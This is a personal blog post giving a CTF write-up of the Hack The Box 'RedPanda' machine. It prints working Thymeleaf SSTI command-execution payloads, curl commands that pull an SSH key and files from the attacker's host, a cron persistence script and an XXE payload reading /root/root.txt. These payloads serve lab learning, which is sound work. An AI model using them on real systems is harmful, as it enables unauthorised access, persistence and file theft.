<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content="#494f5c"><meta name=msapplication-TileColor content="#494f5c"><meta itemprop=name content="Hack The Box - RedPanda"><meta itemprop=description content="Premise RedPanda is a machine challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&mldr; despite being on the &ldquo;easy&rdquo; end of the spectrum.
Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest."><meta itemprop=datePublished content="2022-08-30T00:00:00+00:00"><meta itemprop=dateModified content="2022-08-30T00:00:00+00:00"><meta itemprop=wordCount content="2137"><meta itemprop=keywords content="ctf,"><meta property="og:title" content="Hack The Box - RedPanda"><meta property="og:description" content="Premise RedPanda is a machine challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&mldr; despite being on the &ldquo;easy&rdquo; end of the spectrum.
Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest."><meta property="og:type" content="article"><meta property="og:url" content="https://maclarel.github.io/posts/2022-08/htb_redpanda/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-08-30T00:00:00+00:00"><meta property="article:modified_time" content="2022-08-30T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - RedPanda"><meta name=twitter:description content="Premise RedPanda is a machine challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&mldr; despite being on the &ldquo;easy&rdquo; end of the spectrum.
Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>Hack The Box - RedPanda</title><link rel=stylesheet href=https://maclarel.github.io/css/style.min.037b6ee8f8c1baab6a3d0a9da11c3ff18a7552471f16c59fd98538d5ce99208b.css integrity="sha256-A3tu6PjBuqtqPQqdoRw/8Yp1UkcfFsWf2YU41c6ZIIs=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://maclarel.github.io>Logan MacLaren</a></div><nav class="site-nav hide-in-mobile"><a href=https://maclarel.github.io/posts/>Blog</a></nav></div><div class="hdr-right hdr-icons"><button id=toc-btn class="hdr-btn desktop-only-ib" title="Table of Contents"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3" y2="6"/><line x1="3" y1="12" x2="3" y2="12"/><line x1="3" y1="18" x2="3" y2="18"/></svg></button><span class="hdr-social hide-in-mobile"><a href=https://www.linkedin.com/in/loganmaclaren/ target=_blank rel="noopener me" title=Linkedin><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a><a href=https://github.com/maclarel target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://www.youtube.com/channel/UCRoQUH8UHGi18ERXjYin8AQ target=_blank rel="noopener me" title=Youtube><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22.54 6.42a2.78 2.78.0 00-1.94-2C18.88 4 12 4 12 4s-6.88.0-8.6.46a2.78 2.78.0 00-1.94 2A29 29 0 001 11.75a29 29 0 00.46 5.33A2.78 2.78.0 003.4 19c1.72.46 8.6.46 8.6.46s6.88.0 8.6-.46a2.78 2.78.0 001.94-2 29 29 0 00.46-5.25 29 29 0 00-.46-5.33z"/><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://maclarel.github.io/posts/>Blog</a></li></ul></div><main class="site-main section-inner animated fadeIn faster"><article class=thin><header class=post-header><div class=post-meta><span>Aug 30, 2022</span></div><h1>Hack The Box - RedPanda</h1></header><div class=content><h1 id=premise>Premise<a href=#premise class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>RedPanda is a <code>machine</code> challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I&rsquo;ve completed so far&mldr; despite being on the &ldquo;easy&rdquo; end of the spectrum.</p><p>Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest. From talking to others who have completed the challenge, I probably took a strange path.</p><h1 id=recon>Recon<a href=#recon class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>The machine doesn&rsquo;t respond to ICMP, which had me questioning my VPN connection, but this is intentional. Need to use <code>-Pn</code> with <code>nmap</code> to scan despite this.</p><ul><li>22 and 8080 open</li><li>22 is ssh</li><li>8080 is a spring boot app</li></ul><p><code>ffuf</code> suggests there are /search, /stats, and /error endpoints. <code>/stats</code> gives us some other paths to look at</p><p>There&rsquo;s a hint on the <code>greg</code> page that there&rsquo;s an injection possible somewhere. The stats pages also have an export capability that will dump XML - possible a vector here if we&rsquo;re able to upload content somehow? Doesn&rsquo;t look like there&rsquo;s an endpoint for that.</p><p>The author search is a parameterized URL. Smells like a job for <code>sqlmap</code>, though in the end it doesn&rsquo;t think it&rsquo;s injectable even with max level risk, so this was a dead end.</p><p>Nikto is noting that the server allows other methods that could be fun:</p><pre><code>OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</code></pre><p>This may be a false positive though as none of the endpoints I can hit (including root) actually return these with an OPTIONS call. Apparently this is just a weird thing with spring boot and may be worth ignoring</p><p>There appears to be some form of filtering for the search as the <code>_</code> character is &ldquo;banned&rdquo;, and we can throw a 500 by searching for <code>\</code>. The search allows us to do partials, so we can go by each letter and see what we get back. For example <code>e</code> will return <code>smiley</code> as one of the results. This gives us lots of cute pandas, but nothing actionable.</p><p>Input does seem to be sanitized for what&rsquo;s returned, so no XSS or obvious sqli. Stats <em>might</em> have something injectable but as noted above, no real luck with it&mldr;</p><p>And after some more poking at this&mldr; WE HAVE SSTI! - <code>*{7*7}</code> - some examples of different prefixes @ <a href=https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/>https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a> in <code>hacking thymeleaf</code> heading. <a href=https://github.com/VikasVarshney/ssti-payload>https://github.com/VikasVarshney/ssti-payload</a> is also an excellent tool to generate these payloads.</p><ul><li>Note from future me: This level of encoding was entirely unneeded, but it did work and since I could easily build the encoded string with a script I just ran with it. Obfuscation is a good skill, right? :P</li></ul><p>Here&rsquo;s an example SSTI we can use to do a whoami:</p><pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
</code></pre><p>and uname -a:</p><pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
</code></pre><p>We can use this to get our user flag:</p><pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
</code></pre><p>Do they have an ssh key we can pull? Doesn&rsquo;t look like it&mldr; but we could probably generate one.</p><p>Let&rsquo;s try an encoded version of <code>ssh-keygen -b 2048 -t rsa -f /tmp/sshkely -q -N ""</code>:</p><pre><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(115).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(113)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(34))).getInputStream())}
</code></pre><p>Yep, that works. Now let&rsquo;s get the public key, and cat it into our authorized keys&mldr; so same deal as above, but need to create our <code>.ssh</code> dir first.</p><p>This will probably work, but getting errors with the private key we can leak. Let&rsquo;s try adding my own public key to the remote authorized_keys. We&rsquo;ll probably need to do this by setting up a webserver with python to serve an authorized_keys file we&rsquo;ve created, pull it down with curl, and then update perms. Echoing a string with redirects gets filtered.</p><p>Bingo - <code>woodenk@redpanda:~$</code></p><p>Commands we used or encoded:</p><pre><code>cp ~/.ssh/id_rsa.pub authorized_keys
python3 -m http.server
# encode and send the rest to remote server
mkdir /home/woodenk/.ssh
curl http://&lt;vpn_ip&gt;:8000/authorized_keys -o /home/woodenk/.ssh/authorized_keys
chmod -R 0700 /home/woodenk/.ssh
chown -R woodenk:woodenk /home/woodenk/.ssh
</code></pre><h1 id=lets-get-to-the-root-of-the-problem>Let&rsquo;s get to the root of the problem<a href=#lets-get-to-the-root-of-the-problem class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Looks like we have a few processes running as <code>root</code> but <code>sudo</code>ing the execution as <code>woodenk</code>&mldr; cron job?:</p><pre><code>root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><p>Yep</p><pre><code>root         860  0.0  0.1   6812  3008 ?        Ss   Jul30   0:00 /usr/sbin/cron -f
root         863  0.0  0.1   8356  3404 ?        S    Jul30   0:00  \_ /usr/sbin/CRON -f
root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      884 10.2 30.7 3140528 623772 ?      Sl   Jul30  10:10              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><p>We can&rsquo;t write to <code>root</code>&rsquo;s <code>crontab</code>, nor do we have permissions to modify the jar file noted above. One thing that will be useful for us shortly is that the uncompiled Java code for all of the applications in use for the challenge is available on the box. While it&rsquo;s certainly possible to decompile the running <code>jar</code>s (and needing to do so would have been an evil twist&mldr;), we have everything we need for some whitebox analysis at this point.</p><p>There&rsquo;s a <code>cleanup.sh</code> in <code>/opt/</code> that uses find and executes an rm against what it finds. Maybe there&rsquo;s a way to exploit this with a fishy filename? Come back to this, not an obvious path.</p><p>We have some hardcoded creds for MySQL in the source for the app under <code>/opt/panda_search/src/</code>:</p><pre><code>conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
</code></pre><p>Note: This is the user password for the OS as well, so we can use it for SSH!</p><p>Creds are valid, but the data is useless to us - it&rsquo;s the same stuff we saw about pandas in a browser&mldr; but&mldr; could we add a panda and have the image be the flag? Probably not, but let&rsquo;s try&mldr; The insert works and we can see it in the portal, but the path doesn&rsquo;t resolve as it just comes relative to the website and is passed in verbatim. MySQL is also smart and locks us in as the same user - woodenk - so no priv esc here.</p><h1 id=i-pspy-with-my-little-eye>I <code>pspy</code> with my little eye<a href=#i-pspy-with-my-little-eye class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><pre><code>2022/07/31 15:06:01 CMD: UID=0    PID=1443   | /usr/sbin/CRON -f 
2022/07/31 15:06:01 CMD: UID=0    PID=1444   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:06:01 CMD: UID=0    PID=1446   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/07/31 15:06:01 CMD: UID=0    PID=1445   | /bin/sh /root/run_credits.sh 
...
2022/07/31 15:10:01 CMD: UID=0    PID=1601   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1600   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1604   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1603   | sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1602   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1605   | /usr/bin/systemd-tmpfiles --clean 
2022/07/31 15:10:01 CMD: UID=1000 PID=1621   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=0    PID=1620   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1619   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1622   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1625   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1633   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1635   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1636   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1637   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 

</code></pre><p>Maybe we could do something with this? I doubt we can read the file, but worth a try in a bit. Looks like this may run every 2 minutes&mldr; Worst case we should be able to review what LogParser does.</p><p>Confirming we can&rsquo;t read the stuff from root&rsquo;s dir, but let&rsquo;s see what logparser does. AFAICT this is the overall flow:</p><ul><li>Open the log file at <code>/opt/panda_search/redpanda.log</code></li><li>Parse the log looking for <em>A LINE</em> (the whole line) that conatins <code>.jpg</code></li><li>If the line contains a <code>.jpg</code> reference, parse with the following logic:</li></ul><pre><code>    public static Map parseLog(String line) {
        String[] strings = line.split(&quot;\\|\\|&quot;);
        Map map = new HashMap&lt;&gt;();
        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
        map.put(&quot;ip&quot;, strings[1]);
        map.put(&quot;user_agent&quot;, strings[2]);
        map.put(&quot;uri&quot;, strings[3]);
        

        return map;
    }
</code></pre><ul><li>Get the artist metadata:</li></ul><pre><code>            System.out.println(parsed_data.get(&quot;uri&quot;));
            String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString());
</code></pre><pre><code>    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == &quot;Artist&quot;)
                {
                    return tag.getDescription();
                }
            }
        }

        return &quot;N/A&quot;;
    }
</code></pre><p>Note: Can we put our payload in the image metadata? 🤔</p><ul><li>Dump the output to an XML file:</li></ul><pre><code>            System.out.println(&quot;Artist: &quot; + artist);
            String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;;
            addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString());
</code></pre><p>Current line of thinking is that we might be able to abuse the Artist jpg metdata to create a bogus path and write out our root flag since this process should have access to it. We&rsquo;re no longer limited by the database varchar size limit on the artist name, which should come in handy.</p><p>Our URI <em>does</em> need to be a jpg file, but with how this is formed (a filesystem path) we might be able to store this in a location we control. So the overall steps might be something like:</p><ul><li>Create an image with malicious Artist metadata</li><li>Send a request to that image through a forged database entry that associates it with a panda</li><li>This then writes out a log file in /credits/ with a name we control&mldr;</li><li>Can we then abuse <code>find</code> to run this? Hmmm&mldr;</li></ul><p>Reading through some XXE notes, we may be able to leverage a new entity in the file we control to inject a filepath for it to return in the output, in a field we arbitrarily name.</p><p>Since we know this is writing to a file location that we can control, and we know that when that file is then read by the other process it must have an author of <code>woodenk</code> or <code>damian</code>&mldr;</p><pre><code>      System.out.println(&quot;Exporting xml of: &quot; + author);
      if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;))
      {
          InputStream in = new FileInputStream(&quot;/credits/&quot; + author + &quot;_creds.xml&quot;);
          System.out.println(in);
          return IOUtils.toByteArray(in);
      }
      else
      {
          return IOUtils.toByteArray(&quot;Error, incorrect paramenter 'author'\n\r&quot;);
      }
  }
</code></pre><h1 id=wwf-wwe-wcw-nah-xxe>WWF? WWE? WCW? Nah&mldr; XXE!<a href=#wwf-wwe-wcw-nah-xxe class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h1><p>Can we do something like this?</p><ul><li>Get an arbitrary image</li><li>Update it with exiftool <code>exiftool -Artist="../home/woodenk/pwn' &lt;image>.jpg</code><ul><li>Note that we need the .. here as it&rsquo;s going to resolve relative to <code>/credits/</code> as seen earlier</li></ul></li><li>Upload that file to <code>/home/woodenk</code></li><li>Create our XXE injection with something based on the actual XML output&mldr;</li></ul><pre><code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY injection SYSTEM &quot;file:///root/root.txt&quot;&gt; ]&gt;
&lt;credits&gt;
&lt;author&gt;woodenk&lt;/author&gt;
&lt;image&gt;
&lt;uri&gt;/../../../../../../../../home/woodenk/panda.jpg&lt;/uri&gt;
&lt;pwn&gt;&amp;injection;&lt;/pwn&gt;
&lt;views&gt;1&lt;/views&gt;
&lt;/image&gt;
&lt;/credits&gt;
</code></pre><ul><li>Save this file to <code>/home/woodenk/pwn_creds.xml</code> so that we can request it when the artist is evaluated and we get our path<ul><li>Note, this way it&rsquo;s going to be used by <code>addViewTo</code> in the log parser&mldr;</li></ul></li><li>Since we&rsquo;re associating this with another author (woodenk for example) we may get the injection output in that export? Somehow?</li></ul><p>But how will we request this image in the first place? Can we use SQLi to point a URI to it?</p><p>Also note that both this image and the xml file are going to get deleted, often, so we need to figure out some persistence. I&rsquo;m thinking a cron job that&rsquo;ll run a <em>script</em> out of /dev/shm that&rsquo;ll download these from my host every minute and dump into /home/woodenk</p><p>Placed this script in /dev/shm/foo.sh, and set up cron job to run every minute</p><pre><code>remote=&quot;10.10.14.10:8000&quot;
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
</code></pre><pre><code>remote=&quot;10.10.14.10:8000&quot;
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
</code></pre><p>Now we sit back and wait to see if it works&mldr; Yep, this works for persistence, now let&rsquo;s figure out how to request this damn file in the first place&mldr;</p><p>As far as I can tell, we need to send a request but we can&rsquo;t hit that URI&mldr;</p><p>Fortunately the log parsing is &ldquo;dumb&rdquo; and is looking at positional locations based on a delimieter we know&mldr; <code>||</code> as seen in <code>App.java</code>:</p><pre><code>    public static Map parseLog(String line) {
        String[] strings = line.split(&quot;\\|\\|&quot;);
        Map map = new HashMap&lt;&gt;();
        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
        map.put(&quot;ip&quot;, strings[1]);
        map.put(&quot;user_agent&quot;, strings[2]);
        map.put(&quot;uri&quot;, strings[3]);
        

        return map;
    }
</code></pre><p>Can we override the user agent and just send <em>any</em> request?</p><p><code>curl http://10.129.73.208:8080/ -H "User-Agent: ||/../../../../../../../../home/woodenk/panda.jpg"</code></p><p>Let&rsquo;s spam this and see what happens&mldr; Also going to back off cron job to every 5 min so I don&rsquo;t clobber my own output. No luck yet. Time for a break and come back fresh.</p><p>I just needed to be patient :) Approach above works! Had to wait for background jobs to all run on cron. That lag I noted earlier about the export info being updated is real and almost threw me off course here.</p><p>GG!</p></div><hr class=post-end><footer class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://maclarel.github.io/tags/ctf>ctf</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>2137 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-08-30 00:00 +0000</p></footer></article><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents></nav></aside><div class="post-nav thin"><a class=next-post href=https://maclarel.github.io/posts/2022-09/karabiner/><span class=post-nav-label><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>&nbsp;Newer</span><br><span>Karabiner is a game changer</span></a>
<a class=prev-post href=https://maclarel.github.io/posts/2022-08/defcon30/><span class=post-nav-label>Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span><br><span>DEFCON 30 - Homecoming</span></a></div><div id=comments class=thin></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2022 <a href=https://maclarel.github.io>Logan MacLaren</a> &#183; <a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://maclarel.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" 